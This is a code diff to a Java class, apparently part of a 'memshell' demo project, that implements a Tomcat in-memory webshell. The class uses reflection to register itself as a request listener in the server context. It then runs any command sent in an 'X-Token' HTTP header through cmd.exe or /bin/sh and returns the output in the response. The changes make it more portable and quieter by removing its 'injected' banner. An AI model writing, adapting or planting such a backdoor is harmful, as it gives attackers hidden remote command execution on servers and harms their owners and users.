@@ -1,8 +1,5 @@
 package com.demo.memshell;
 
-import org.apache.catalina.core.ApplicationContext;
-import org.apache.catalina.core.StandardContext;
-
 import javax.servlet.ServletContext;
 import javax.servlet.ServletRequestEvent;
 import javax.servlet.ServletRequestListener;
@@ -20,6 +17,7 @@ import java.lang.reflect.Field;
 public class TomcatListenerThreadMS implements ServletRequestListener {
     private static HttpServletRequest request;
     private static HttpServletResponse response;
+    private static String header = "X-Token";
 
     public TomcatListenerThreadMS() {
 
@@ -64,19 +62,20 @@ public class TomcatListenerThreadMS implements ServletRequestListener {
             /**
              * 注入 Listener
              */
-            StandardContext standardContext;
+            Object standardContext;
             try {
                 ServletContext servletContext = (ServletContext) request.getClass().getDeclaredMethod("getServletContext").invoke(request);
-                ApplicationContext applicationContext = (ApplicationContext) getFieldValue(servletContext, "context");
-                standardContext = (StandardContext) getFieldValue(applicationContext, "context");
+                Object applicationContext = getFieldValue(servletContext, "context");
+                standardContext = getFieldValue(applicationContext, "context");
             } catch (NoSuchMethodException e) {
-                standardContext = (StandardContext) getFieldValue(request, "context");
+                standardContext = getFieldValue(request, "context");
             }
             TomcatListenerThreadMS listenerMemShell = new TomcatListenerThreadMS();
-            standardContext.addApplicationEventListener(listenerMemShell);
+            standardContext.getClass().getMethod("addApplicationEventListener", Object.class).invoke(standardContext, listenerMemShell);
 
 
         } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
@@ -90,14 +89,13 @@ public class TomcatListenerThreadMS implements ServletRequestListener {
     public void requestInitialized(ServletRequestEvent servletRequestEvent) {
         try {
             HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequestEvent.getServletRequest();
-            String header = httpServletRequest.getHeader("X-Token");
-            if (header == null) {
+            String cmd = httpServletRequest.getHeader(header);
+            if (cmd == null) {
                 return;
             }
-            String result = exec(header);
+            String result = exec(cmd);
             org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) getFieldValue(httpServletRequest, "request");
             PrintWriter printWriter = request.getResponse().getWriter();
-            printWriter.println("TomcatListenerThreadMS injected");
             printWriter.println(result);
         } catch (Exception e) {
 
@@ -108,7 +106,7 @@ public class TomcatListenerThreadMS implements ServletRequestListener {
     public static String exec(String str) {
         try {
             String[] cmd = null;
-            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                 cmd = new String[]{"cmd.exe", "/c", str};
             } else {
                 cmd = new String[]{"/bin/sh", "-c", str};
